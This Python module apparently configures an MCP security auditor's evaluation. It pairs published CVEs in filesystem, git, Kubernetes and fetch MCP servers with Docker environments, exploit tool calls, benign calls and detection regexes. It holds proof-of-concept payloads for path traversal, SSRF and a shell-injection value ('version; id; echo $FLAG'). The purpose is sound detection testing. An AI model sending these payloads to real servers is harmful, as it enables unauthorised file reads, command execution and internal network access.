import re
from collections.abc import AsyncGenerator, Awaitable, Callable, Generator, Sequence
from contextlib import AbstractContextManager, asynccontextmanager, contextmanager
from dataclasses import dataclass
from pathlib import Path

from evals.concurrency import entered_in_thread
from evals.cve_environments import (
    Launch,
    PlantedLaunch,
    command_injection_env,
    filesystem_env,
    git_init_traversal_env,
    prefix_collision_env,
    repository_bypass_env,
    ssrf_env,
)
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place
from evals.cve_planting import (
    RANDOM_NONCES,
    NonceSource,
    PlantingHost,
    PlantingSpec,
    SymbolicUser,
)
from evals.cve_planting import planting_spec as compute_planting_spec
from mcp_auditor.domain.ports import MCPClientPort

# The filesystem CVEs surface the leak through a read tool, but the blind
# generator first needs list_directory to discover the planted symlink.
FILESYSTEM_READ_TOOLS = frozenset({"read_file", "list_directory"})

DOCKER_DIRECTORY = Path(__file__).parent / "docker"


def image_tag(name: str) -> str:
    return f"mcp-auditor-cve-{name}:local"


def image_dockerfile(name: str, docker_directory: Path = DOCKER_DIRECTORY) -> Path:
    return docker_directory / f"Dockerfile.{name}"


@dataclass(frozen=True)
class CVETarget:
    cve_id: str
    severity: str
    mechanism: MechanismClass | None
    aim: re.Pattern[str]
    reaches: frozenset[str]  # the flaw's reachable_by tokens, among the three in cve_places
    kept_places: tuple[str, ...]  # location ids the flaw alone reaches, empty until filled
    images: tuple[str, ...]  # services of evals/docker/compose.yml
    server_image: str  # the service of images that runs the server under audit
    planting_host: PlantingHost  # what this target's launch can hold (user, cwd, network)
    builder: Callable[[str, PlantingSpec], AbstractContextManager[Launch]]  # (image tag, spec)
    exploits: tuple[Callable[[MCPClientPort], Awaitable[None]], ...]
    benign: Callable[[MCPClientPort], Awaitable[None]]
    awaited_capability: str | None
    note: str
    tools_filter: frozenset[str] | None
    ci_skip_reason: str | None = None

    def planting_spec(
        self, to_plant: Sequence[Place], nonces: NonceSource = RANDOM_NONCES
    ) -> PlantingSpec:
        return compute_planting_spec(to_plant, self.planting_host, nonces)

    @contextmanager
    def environment(self, spec: PlantingSpec) -> Generator[PlantedLaunch]:
        with self.builder(image_tag(self.server_image), spec) as launch:
            yield PlantedLaunch(launch, spec.nonces)

    @asynccontextmanager
    async def launched(
        self, to_plant: Sequence[Place], *, nonces: NonceSource = RANDOM_NONCES
    ) -> AsyncGenerator[PlantedLaunch]:
        spec = self.planting_spec(to_plant, nonces)
        async with entered_in_thread(self.environment(spec)) as planted_launch:
            yield planted_launch


@dataclass(frozen=True)
class OutOfScopeCVE:
    cve_id: str
    severity: str
    reason: str


# The user, working directory and network each target's launch runs with (planting emits them).
_HOST_NO_NETWORK = PlantingHost(SymbolicUser.HOST, "/", has_network=False)
_UNPRIVILEGED_NO_NETWORK = PlantingHost(SymbolicUser.UNPRIVILEGED, "/", has_network=False)
_UNPRIVILEGED_WITH_NETWORK = PlantingHost(SymbolicUser.UNPRIVILEGED, "/", has_network=True)


async def _exploit_symlink_traversal(client: MCPClientPort) -> None:
    await client.call_tool("read_file", {"path": "/work/sandbox/report"})


async def _exploit_prefix_collision(client: MCPClientPort) -> None:
    await client.call_tool("read_file", {"path": "/work/sandbox_secret/flag.txt"})


async def _list_sandbox(client: MCPClientPort) -> None:
    await client.call_tool("list_directory", {"path": "/work/sandbox"})


async def _exploit_repository_bypass(client: MCPClientPort) -> None:
    await client.call_tool("git_log", {"repo_path": "/work/other"})


async def _benign_repository_bypass(client: MCPClientPort) -> None:
    await client.call_tool("git_log", {"repo_path": "/work/repo"})


async def _exploit_git_init_traversal(client: MCPClientPort) -> None:
    await client.call_tool("git_init", {"repo_path": "/work/secret"})
    await client.call_tool("git_add", {"repo_path": "/work/secret", "files": ["."]})
    await client.call_tool("git_diff_staged", {"repo_path": "/work/secret"})


async def _benign_git_init_traversal(client: MCPClientPort) -> None:
    await client.call_tool("git_diff_staged", {"repo_path": "/work/repo"})


async def _exploit_kubernetes_injection(client: MCPClientPort) -> None:
    await client.call_tool("kubectl_generic", {"command": "version; id; echo $FLAG"})


async def _benign_kubernetes_injection(client: MCPClientPort) -> None:
    await client.call_tool("kubectl_generic", {"command": "version"})


async def _exploit_fetch_ssrf(client: MCPClientPort) -> None:
    await client.call_tool("fetch_txt", {"url": "http://sentinel/"})


async def _benign_fetch_ssrf(client: MCPClientPort) -> None:
    await client.call_tool("fetch_txt", {"url": "http://example.invalid/"})


# The aims describe the flaw class from the published mechanism, not the planted instance,
# except 53109: its link is a name the server itself lists, so aiming at it already needs
# the discovery the CVE requires.
_PLANTED_LINK_AIM = re.compile(r"(^|/)report$")
_PREFIX_SIBLING_AIM = re.compile(r"^/work/sandbox[^/]")
_OUTSIDE_REPO_AIM = re.compile(r"^/(?!work/repo(/|$))")
_SHELL_METACHARACTER_AIM = re.compile(r"[;&|`]|\$\(")
# A URL whose host is loopback (shortened forms such as 127.1 included), link-local,
# RFC 1918, 0.0.0.0, [::1], an IPv6 unique local or IPv4-mapped address, or a single-label
# name. A public URL that redirects inward does not read as aimed, since the aim reads only
# the arguments sent: that affects the miss class alone, never a detection.
_INTERNAL_HOST_AIM = re.compile(
    r"^[a-z][a-z0-9+.-]*://(?:[^/?#@]*@)?"
    r"(?:127(?:\.\d{1,3}){1,3}"
    r"|169\.254(?:\.\d{1,3}){2}"
    r"|10(?:\.\d{1,3}){3}"
    r"|172\.(?:1[6-9]|2\d|3[01])(?:\.\d{1,3}){2}"
    r"|192\.168(?:\.\d{1,3}){2}"
    r"|0\.0\.0\.0"
    r"|\[::1\]"
    r"|\[fd[0-9a-f]{2}:[0-9a-f:]*\]"
    r"|\[::ffff:[0-9a-f.:]+\]"
    r"|[a-z0-9_-]+)"
    r"(?::\d+)?(?:[/?#]|$)",
    re.IGNORECASE,
)


# Each severity, here and in OUT_OF_SCOPE_CVES, is the CVSS score of the CVE record on
# cve.org, the CNA's or CISA-ADP's when the CNA gives none, with its version and source.
# Invariant for every target below: tools_filter must name the same real tool
# that exploit calls. A wrong name raises in filter_tools, so the run is
# reported as not_run rather than as a missed detection.
CVE_TARGETS: list[CVETarget] = [
    CVETarget(
        cve_id="CVE-2025-53109",
        severity="CVSS 7.3 (v4.0, CNA)",
        mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
        aim=_PLANTED_LINK_AIM,
        reaches=frozenset({"arbitrary_read"}),
        kept_places=(),
        images=("filesystem",),
        server_image="filesystem",
        planting_host=_HOST_NO_NETWORK,
        builder=filesystem_env,
        exploits=(_exploit_symlink_traversal,),
        benign=_list_sandbox,
        awaited_capability="cross-tool chains",
        note=(
            "Symlink inside the allowed dir; needs list_directory discovery then read_file. "
            "The current audit order (read_file before list_directory) neutralises "
            "cross-tool learning."
        ),
        tools_filter=FILESYSTEM_READ_TOOLS,
    ),
    CVETarget(
        cve_id="CVE-2025-53110",
        severity="CVSS 7.3 (v4.0, CNA)",
        mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
        aim=_PREFIX_SIBLING_AIM,
        reaches=frozenset({"arbitrary_read"}),
        kept_places=(),
        images=("filesystem",),
        server_image="filesystem",
        planting_host=_HOST_NO_NETWORK,
        builder=prefix_collision_env,
        exploits=(_exploit_prefix_collision,),
        benign=_list_sandbox,
        awaited_capability="declared-scope awareness",
        note="Prefix-collision sibling is derivable only from the declared boundary.",
        tools_filter=FILESYSTEM_READ_TOOLS,
    ),
    CVETarget(
        cve_id="CVE-2025-68145",
        severity="CVSS 6.4 (v4.0, CNA)",
        mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
        aim=_OUTSIDE_REPO_AIM,
        reaches=frozenset({"arbitrary_read"}),
        kept_places=(),
        images=("git",),
        server_image="git",
        planting_host=_HOST_NO_NETWORK,
        builder=repository_bypass_env,
        exploits=(_exploit_repository_bypass,),
        benign=_benign_repository_bypass,
        awaited_capability="declared-scope awareness",
        note="--repository bypass needs the generator to aim outside the declared repo.",
        tools_filter=frozenset({"git_log"}),
    ),
    CVETarget(
        cve_id="CVE-2025-68143",
        severity="CVSS 6.5 (v4.0, CNA)",
        mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
        aim=_OUTSIDE_REPO_AIM,
        reaches=frozenset({"arbitrary_read"}),
        kept_places=(),
        images=("git",),
        server_image="git",
        planting_host=_HOST_NO_NETWORK,
        builder=git_init_traversal_env,
        exploits=(_exploit_git_init_traversal,),
        benign=_benign_git_init_traversal,
        awaited_capability="cross-tool chains + declared-scope awareness",
        note="git_init(out-of-scope) -> git_add(.) -> git_diff_staged surfaces the content.",
        tools_filter=frozenset({"git_init", "git_add", "git_diff_staged"}),
        ci_skip_reason=(
            "git_diff_staged hangs on GitHub-hosted runners (runner-specific, "
            "not reproducible locally); still covered by local calibration and the graded run"
        ),
    ),
    CVETarget(
        cve_id="CVE-2025-53355",
        severity="CVSS 7.5 (v3.1, CNA)",
        mechanism=MechanismClass.COMMAND_EXECUTION,
        aim=_SHELL_METACHARACTER_AIM,
        reaches=frozenset({"command_execution"}),
        kept_places=(),
        images=("kubernetes",),
        server_image="kubernetes",
        planting_host=_UNPRIVILEGED_NO_NETWORK,
        builder=command_injection_env,
        exploits=(_exploit_kubernetes_injection,),
        benign=_benign_kubernetes_injection,
        awaited_capability=None,
        note="Command injection via kubectl_generic (execSync shell), surfaces an env nonce.",
        tools_filter=frozenset({"kubectl_generic"}),
    ),
    CVETarget(
        cve_id="CVE-2025-65513",
        severity="CVSS 7.5 (v3.1, CISA-ADP)",
        mechanism=MechanismClass.INTERNAL_FETCH,
        aim=_INTERNAL_HOST_AIM,
        reaches=frozenset({"internal_fetch"}),
        kept_places=(),
        images=("fetch", "sentinel"),
        server_image="fetch",
        planting_host=_UNPRIVILEGED_WITH_NETWORK,
        builder=ssrf_env,
        exploits=(_exploit_fetch_ssrf,),
        benign=_benign_fetch_ssrf,
        awaited_capability="declared-scope awareness",
        note="SSRF via is_ip_private bypass; a Docker sidecar serves the internal endpoint.",
        tools_filter=frozenset({"fetch_txt"}),
    ),
]


OUT_OF_SCOPE_CVES: list[OutOfScopeCVE] = [
    OutOfScopeCVE(
        cve_id="CVE-2025-68144",
        severity="CVSS 6.3 (v4.0, CNA)",
        reason=(
            "Argument injection (git_diff --output=/path) overwrites a file silently; "
            "nothing surfaces in a tool response, so it needs instrumented observation "
            "(ADR 011)."
        ),
    ),
]
